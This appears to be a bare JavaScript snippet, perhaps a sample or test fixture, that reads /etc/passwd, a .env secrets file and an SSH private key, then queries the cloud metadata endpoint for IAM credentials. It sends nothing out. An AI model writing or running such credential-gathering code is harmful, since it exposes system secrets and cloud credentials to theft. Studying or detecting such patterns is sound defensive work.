import fs from "fs"

const passwords = fs.readFileSync("/etc/passwd", "utf8")

const envSecrets = fs.readFileSync(".env", "utf8")

const sshKey = fs.readFileSync(".ssh/id_rsa", "utf8")

fetch("https://169.254.169.254/latest/meta-data/iam/security-credentials/")
